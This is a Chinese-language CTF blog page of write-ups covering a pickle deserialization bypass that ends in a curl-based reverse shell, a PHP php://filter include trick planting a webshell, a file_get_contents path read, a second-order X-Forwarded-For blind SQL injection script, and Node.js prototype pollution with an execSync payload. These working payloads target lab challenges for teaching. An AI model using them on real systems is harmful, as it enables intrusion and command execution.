<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import pickle</span><br><span class="line">import pickletools</span><br><span class="line">import base64</span><br><span class="line">import config</span><br><span class="line">import io</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">class RestrictedUnpickler(pickle.Unpickler):</span><br><span class="line">    def find_class(self, module, name):</span><br><span class="line">        if module in [&#x27;config&#x27;] and &quot;__&quot; not in name:</span><br><span class="line">            return getattr(sys.modules[module], name)</span><br><span class="line">        raise pickle.UnpicklingError(&quot;&#x27;%s.%s&#x27; not allowed&quot; % (module, name))</span><br><span class="line"></span><br><span class="line">data=b&#x27;&#x27;&#x27;cconfig</span><br><span class="line">notadmin</span><br><span class="line">(S&#x27;admin&#x27;</span><br><span class="line">S&#x27;yes&#x27;</span><br><span class="line">u0(cconfig</span><br><span class="line">backdoor</span><br><span class="line">(S&#x27;exec(&quot;import os;os.system(&#x27;curl &#x27;);&quot;)&#x27;</span><br><span class="line">Io.&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">data=base64.encode(data)</span><br><span class="line">print(data)</span><br><span class="line">result=RestrictedUnpickler(io.BytesIO(base64.decode(data))).load()</span><br><span class="line">print(config.notadmin)</span><br></pre></td></tr></table></figure>
<p>即可伪造notadmin[“admin”]==”yes”，然后执行命令，反弹shell</p>
<h1 id="EasyFilter"><a href="#EasyFilter" class="headerlink" title="EasyFilter"></a>EasyFilter</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   ini_set(&quot;open_basedir&quot;,&quot;./&quot;);</span><br><span class="line">   if(!isset($_GET[&#x27;action&#x27;]))&#123;</span><br><span class="line">       highlight_file(__FILE__);</span><br><span class="line">       die();</span><br><span class="line">   &#125;</span><br><span class="line">   if($_GET[&#x27;action&#x27;] == &#x27;w&#x27;)&#123;</span><br><span class="line">       @mkdir(&quot;./files/&quot;);</span><br><span class="line">       $content = $_GET[&#x27;c&#x27;];</span><br><span class="line">       $file = bin2hex(random_bytes(5));</span><br><span class="line">       file_put_contents(&quot;./files/&quot;.$file,base64_encode($content));</span><br><span class="line">       echo &quot;./files/&quot;.$file;</span><br><span class="line">   &#125;elseif($_GET[&#x27;action&#x27;] == &#x27;r&#x27;)&#123;</span><br><span class="line">       $r = $_GET[&#x27;r&#x27;];</span><br><span class="line">       $file = &quot;./files/&quot;.$r;</span><br><span class="line">       include(&quot;php://filter/resource=$file&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<p>这道题想了很长时间，没思路，最后发现原来的封装的问题，就是include()里的resource对输入的对象进行封装，然后我们只需要再用base64解码封装即可，所以构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?action=w&amp;c=&lt;?php system(&quot;cat /flag&quot;);?&gt;</span><br><span class="line"></span><br><span class="line">?action=r&amp;r=convert.base64-decode/../62d1ef7ceb</span><br></pre></td></tr></table></figure>
<p>即可base64解码并通过include函数执行命令</p>
<h1 id="new-hospital"><a href="#new-hospital" class="headerlink" title="new_hospital"></a>new_hospital</h1><p>其实它是新框架里加入了旧框架，当在/feature.php?id=2目录下是，发现报错</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">knowledge</span><br><span class="line">Warning: file_get_contents(2.js): failed to open stream: No such file or directory in /var/www/html/feature.php on line 468</span><br></pre></td></tr></table></figure>
<p>但是报错的函数是file_get_contents()函数，可以利用一下，所以我们通过目录扫描，发现旧框架在/old目录下，所以我们可以构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/old/feature.php</span><br></pre></td></tr></table></figure>
<p>然后发现输入文件的点在cookie里的API中，所以只要我们构造/var/www/html/flag.php，然后进行base64编码提交即可</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-X-Forwarded-For注入以及盲注加二次注入 " class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/10/22/X-Forwarded-For%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E7%9B%B2%E6%B3%A8%E5%8A%A0%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%20/" class="article-date">
  	<time datetime="2021-10-21T16:00:00.000Z" itemprop="datePublished">2021-10-22</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/10/22/X-Forwarded-For%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E7%9B%B2%E6%B3%A8%E5%8A%A0%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%20/">
        X-Forwarded-For注入以及盲注加二次注入
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="X-Forwarded-For注入以及盲注加二次注入"><a href="#X-Forwarded-For注入以及盲注加二次注入" class="headerlink" title="X-Forwarded-For注入以及盲注加二次注入"></a>X-Forwarded-For注入以及盲注加二次注入</h1><p>打开页面，发现可以构造?url=网址，来访问网站，发现没有什么价值信息就抓包，然后回来的包中，我们可以发现一个重要信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Debug Info: </span><br><span class="line"> Duration: 0.045696973800659 s </span><br><span class="line"> Current Ip: 110.90.9.211 </span><br><span class="line">Last Ip: 123 --&gt;</span><br></pre></td></tr></table></figure>
<p>可以看见current ip字段，这个字段和X-Forwarded-For字段是一样的功能，都是用来表示当前自己的ip，而last ip推测是从数据库中读取出来的，而它对应的是Current ip字段，然后我们尝试构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 1</span><br></pre></td></tr></table></figure>
<p>发现回显的是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Debug Info: </span><br><span class="line"> Duration: 0.054388046264648 s </span><br><span class="line"> Current Ip: 1 </span><br><span class="line">Last Ip: 110.90.9.211 --&gt;</span><br></pre></td></tr></table></figure>
<p>原来current ip的值变为last ip的值，猜测有写入，当提交X-Forwarded-For，会将原来的回显包里的current ip的值写入Last ip中，而提交的X-Forwarded-For的值变为Current ip的值，因此，这里可能存在二次注入，所以我们可以</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">首先构造</span><br><span class="line">X-Forwarded-For: 0&#x27;or&#x27;1</span><br><span class="line"></span><br><span class="line">然后构造</span><br><span class="line">X-Forwarded-For: 123</span><br><span class="line"></span><br><span class="line">最后再构造一次</span><br><span class="line">X-Forwarded-For: 123</span><br><span class="line"></span><br><span class="line">发现Last ip字段的值变为1</span><br></pre></td></tr></table></figure>
<p>所以我们可以使用盲注，所以exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8 </span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url = &#x27;http://node4.buuoj.cn:25670/&#x27;</span><br><span class="line"></span><br><span class="line">res = &#x27;&#x27;</span><br><span class="line">for i in range(1,200):</span><br><span class="line">    print(i)</span><br><span class="line">    left = 31</span><br><span class="line">    right = 127</span><br><span class="line">    mid = left + ((right - left)&gt;&gt;1)</span><br><span class="line">    while left &lt; right:</span><br><span class="line">        #payload = &quot;0&#x27; or (ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span><br><span class="line">        #payload  = &quot;0&#x27; or (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = &#x27;F4l9_D4t4B45e&#x27;),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span><br><span class="line">        #payload  = &quot;0&#x27; or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;F4l9_t4b1e&#x27;),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span><br><span class="line">        payload = &quot;0&#x27; or (ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span><br><span class="line">        headers = &#123;</span><br><span class="line">                    &#x27;Cookie&#x27;: &#x27;track_uuid=6e17fe5e-140c-4138-dea6-d197aa6214e3&#x27;,</span><br><span class="line">                    &#x27;X-Forwarded-For&#x27;: payload</span><br><span class="line">                    &#125;</span><br><span class="line">        r = requests.post(url = url, headers = headers)</span><br><span class="line"></span><br><span class="line">        payload = &#x27;111&#x27;</span><br><span class="line">        headers = &#123;</span><br><span class="line">                    &#x27;Cookie&#x27;: &#x27;track_uuid=6e17fe5e-140c-4138-dea6-d197aa6214e3&#x27;,</span><br><span class="line">                    &#x27;X-Forwarded-For&#x27;: payload</span><br><span class="line">                    &#125;</span><br><span class="line">        r = requests.post(url = url, headers = headers)</span><br><span class="line"></span><br><span class="line">        payload = &#x27;111&#x27;</span><br><span class="line">        headers = &#123;</span><br><span class="line">                    &#x27;Cookie&#x27;: &#x27;track_uuid=6e17fe5e-140c-4138-dea6-d197aa6214e3&#x27;,</span><br><span class="line">                    &#x27;X-Forwarded-For&#x27;: payload</span><br><span class="line">                    &#125; </span><br><span class="line">        r = requests.post(url = url, headers = headers)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        if r.status_code == 429:</span><br><span class="line">            print(&#x27;too fast&#x27;)</span><br><span class="line">            time.sleep(2)</span><br><span class="line">        if &#x27;Last Ip: 1&#x27;  in r.text:</span><br><span class="line">            left = mid + 1</span><br><span class="line">        elif &#x27;Last Ip: 1&#x27; not in r.text:</span><br><span class="line">            right = mid </span><br><span class="line">        mid = left + ((right-left)&gt;&gt;1)</span><br><span class="line">    if mid == 31 or mid == 127:</span><br><span class="line">        break</span><br><span class="line">    res += chr(mid)</span><br><span class="line">    print(str(mid),res)</span><br><span class="line">    time.sleep(1)</span><br><span class="line"># information_schema,ctftraining,mysql,performance_schema,test,ctf,F4l9_D4t4B45e</span><br><span class="line">#F4l9_t4b1e</span><br><span class="line">#F4l9_C01uMn</span><br></pre></td></tr></table></figure>
<p>最后可以爆出flag</p>
<p>参考文章：[<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/08aabdbc8a7b]">https://www.jianshu.com/p/08aabdbc8a7b]</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-js原型链污染以及js大小写函数特性" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/10/21/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E4%BB%A5%E5%8F%8Ajs%E5%A4%A7%E5%B0%8F%E5%86%99%E5%87%BD%E6%95%B0%E7%89%B9%E6%80%A7/" class="article-date">
  	<time datetime="2021-10-20T16:00:00.000Z" itemprop="datePublished">2021-10-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/10/21/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E4%BB%A5%E5%8F%8Ajs%E5%A4%A7%E5%B0%8F%E5%86%99%E5%87%BD%E6%95%B0%E7%89%B9%E6%80%A7/">
        js原型链污染以及js大小写函数特性
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="js原型链污染以及js大小写函数特性"><a href="#js原型链污染以及js大小写函数特性" class="headerlink" title="js原型链污染以及js大小写函数特性"></a>js原型链污染以及js大小写函数特性</h1><h2 id="js原型链污染"><a href="#js原型链污染" class="headerlink" title="js原型链污染"></a>js原型链污染</h2><p>javaScript是一门灵活的语言，基于原型实现继承，原型是javascript的继承基础，而根据ECMAScript标准，someObject.[[Prototype]]符号是用于指向someObject的原型，而从ECMAScript6开始，[[Prototype]]可以通过Object.getPrototypeOf()和Object.setPrototypeOf()访问器来访问</p>
<p>每一个实例化对象都有一个私有属性__proto__指向它的构造函数的原型prototype，即</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test1.__proto__==Test.prototype //true</span><br></pre></td></tr></table></figure>
<p>原型prototype是类的一个属性，而这个属性中的值和方法是每一个由该类实例化出来的对象所共有的，我们可以通过实例化对象test1.__proto__来访问Test类的原型，如果我们可以控制实例化对象的__proto__属性，则等于可以修改该类的所有实例化对象的__proto__属性</p>
<h3 id="原型链污染原理"><a href="#原型链污染原理" class="headerlink" title="原型链污染原理"></a>原型链污染原理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">test1=new Test()</span><br><span class="line">test2=new Test()</span><br><span class="line"></span><br><span class="line">test1.b //undefined</span><br><span class="line"></span><br><span class="line">test2.__proto__.b=&quot;12&quot;</span><br><span class="line"></span><br><span class="line">test1.b //12</span><br></pre></td></tr></table></figure>
<p>我们可以看见本来Test类的实例化对象test1是没有b属性的，但是当我们对Test类的实例化对象test2做了私有属性__proto__赋值后(test2.__proto__指向Test的原型prototype)，test1.b就有值了，这是因为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 在执行test1.b时，会先在对象test1中寻找b</span><br><span class="line">2. 找不到时，会在test1.__proto__中寻找(这里的test1.__proto__一样是指向Test类的原型prototype)</span><br><span class="line">3. 如果仍然找不到的话，就会在test1.__proto__.__proto__中继续寻找b</span><br><span class="line">4. 因此寻找，知道找到null结束(即Object.prototype的__proto__就是null)</span><br></pre></td></tr></table></figure>

<p>在js中，我们可以通过找到可以控制数组(对象)的键名的位置来控制实例化对象的__proto__来污染原型链，比较明显的是以下两个对象</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 对象clone</span><br><span class="line">2. 对象merge</span><br></pre></td></tr></table></figure>
<p>同时如果要__proto__作为key可以被赋值的话，需要使用json进行解析，否则会将__proto__当作是原型而不是key，从而无法进行污染，实例如下</p>
<p>污染链失败</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let o1=&#123;&#125;</span><br><span class="line">let o2=&#123;a:1,&quot;__proto__&quot;:&#123;b:2&#125;&#125;</span><br><span class="line">merge(o1,o2) //1 2</span><br><span class="line">console.log(o1.a,o1.b) //无结果输出</span><br></pre></td></tr></table></figure>

<p>污染链成功</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let o1=&#123;&#125;</span><br><span class="line">let o2=JSON.parse(&#x27;&#123;&quot;a&quot;:1,&quot;__proto__&quot;:&#123;&quot;b&quot;:2&#125;&#125;&#x27;)</span><br><span class="line">merge(o1,o2) //1 2</span><br><span class="line">console.log(o1.a,o1.b) //2</span><br></pre></td></tr></table></figure>

<p>而对于要污染哪个变量，需要找代码的执行点，js代码代码执行点可以找</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. eval函数</span><br><span class="line">2. new Function</span><br></pre></td></tr></table></figure>
<p>而对于包中的Content-Type字段，需要改为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-type: application/json</span><br></pre></td></tr></table></figure>

<h2 id="js大小写函数特性"><a href="#js大小写函数特性" class="headerlink" title="js大小写函数特性"></a>js大小写函数特性</h2><h3 id="toUpperCase"><a href="#toUpperCase" class="headerlink" title="toUpperCase()"></a>toUpperCase()</h3><p>toUpperCase()是javascript中将小写转换为大写的函数，它有一个特性，就是有两个奇特字符在经过toUpperCase()后会变为大写的I和S</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;ı&quot;.toUpperCase() == &#x27;I&#x27;</span><br><span class="line"></span><br><span class="line">&quot;ſ&quot;.toUpperCase() == &#x27;S&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="toLowerCase"><a href="#toLowerCase" class="headerlink" title="toLowerCase()"></a>toLowerCase()</h3><p>toLowerCase()是js中将大写转换为小写的函数，它也有一个特性，就是将一个奇特字符在经过toUpperCase()后会变为小写的k</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;K&quot;.toLowerCase() == &#x27;k&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="实例（Ez-Express"><a href="#实例（Ez-Express" class="headerlink" title="实例（Ez_Express)"></a>实例（Ez_Express)</h2><p>打开页面，我们发现是一个注册/登录界面，而且给出提示，要使用admin来注册登录，但是却不行，所以我们可以使用dirmap进行扫描，发现有<a target="_blank" rel="noopener" href="http://www.zip泄露,解压后,我们看核心源码/">www.zip泄露，解压后，我们看核心源码</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.js</span><br><span class="line">app.js</span><br></pre></td></tr></table></figure>
<p>查看index.js</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">var express = require(&#x27;express&#x27;);</span><br><span class="line">var router = express.Router();</span><br><span class="line">const isObject = obj =&gt; obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === Object;</span><br><span class="line">const merge = (a, b) =&gt; &#123;</span><br><span class="line">  for (var attr in b) &#123;</span><br><span class="line">    if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return a</span><br><span class="line">&#125;</span><br><span class="line">const clone = (a) =&gt; &#123;</span><br><span class="line">  return merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line">function safeKeyword(keyword) &#123;</span><br><span class="line">  if(keyword.match(/(admin)/is)) &#123;</span><br><span class="line">      return keyword</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return undefined</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.get(&#x27;/&#x27;, function (req, res) &#123;</span><br><span class="line">  if(!req.session.user)&#123;</span><br><span class="line">    res.redirect(&#x27;/login&#x27;);</span><br><span class="line">  &#125;</span><br><span class="line">  res.outputFunctionName=undefined;</span><br><span class="line">  res.render(&#x27;index&#x27;,data=&#123;&#x27;user&#x27;:req.session.user.user&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.get(&#x27;/login&#x27;, function (req, res) &#123;</span><br><span class="line">  res.render(&#x27;login&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.post(&#x27;/login&#x27;, function (req, res) &#123;</span><br><span class="line">  if(req.body.Submit==&quot;register&quot;)&#123;</span><br><span class="line">   if(safeKeyword(req.body.userid))&#123;</span><br><span class="line">    res.end(&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;) </span><br><span class="line">   &#125;</span><br><span class="line">    req.session.user=&#123;</span><br><span class="line">      &#x27;user&#x27;:req.body.userid.toUpperCase(),</span><br><span class="line">      &#x27;passwd&#x27;: req.body.pwd,</span><br><span class="line">      &#x27;isLogin&#x27;:false</span><br><span class="line">    &#125;</span><br><span class="line">    res.redirect(&#x27;/&#x27;); </span><br><span class="line">  &#125;</span><br><span class="line">  else if(req.body.Submit==&quot;login&quot;)&#123;</span><br><span class="line">    if(!req.session.user)&#123;res.end(&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;)&#125;</span><br><span class="line">    if(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123;</span><br><span class="line">      req.session.user.isLogin=true;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">      res.end(&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">  res.redirect(&#x27;/&#x27;); ;</span><br><span class="line">&#125;);</span><br><span class="line">router.post(&#x27;/action&#x27;, function (req, res) &#123;</span><br><span class="line">  if(req.session.user.user!=&quot;ADMIN&quot;)&#123;res.end(&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;)&#125; </span><br><span class="line">  req.session.user.data = clone(req.body);</span><br><span class="line">  res.end(&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;);  </span><br><span class="line">&#125;);</span><br><span class="line">router.get(&#x27;/info&#x27;, function (req, res) &#123;</span><br><span class="line">  res.render(&#x27;index&#x27;,data=&#123;&#x27;user&#x27;:res.outputFunctionName&#125;);</span><br><span class="line">&#125;)</span><br><span class="line">module.exports = router;</span><br></pre></td></tr></table></figure>
<p>我们看见clone和merge，可以初步判断是js原型链污染，而我们再看这个点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res.render(&#x27;index&#x27;,data=&#123;&#x27;user&#x27;:res.outputFunctionName&#125;);</span><br></pre></td></tr></table></figure>
<p>可知，我们污染的变量是outputFunctionName，因为这个变量的值会写入index中，然后被执行</p>
<p>但是首先我们需要注册/登录，而从safeKeyword(req.body.userid)，查看safeKeyword()函数，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function safeKeyword(keyword) &#123;</span><br><span class="line">  if(keyword.match(/(admin)/is)) &#123;</span><br><span class="line">      return keyword</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>可见其过滤了admin，但是有一个点，让我们可以利用js的特性进行突破</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;user&#x27;:req.body.userid.toUpperCase()</span><br></pre></td></tr></table></figure>
<p>所以我们使用”ı”来代替”I”，所以我们可以利用admın来进行注册登录，然后根据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">router.post(&#x27;/action&#x27;, function (req, res) &#123;</span><br><span class="line">  if(req.session.user.user!=&quot;ADMIN&quot;)&#123;res.end(&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;)&#125; </span><br><span class="line">  req.session.user.data = clone(req.body);</span><br><span class="line">  res.end(&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;);  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>构造一条原型链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;lua&quot;:&quot;a&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a=1;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)//&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>然后构造payload</p>
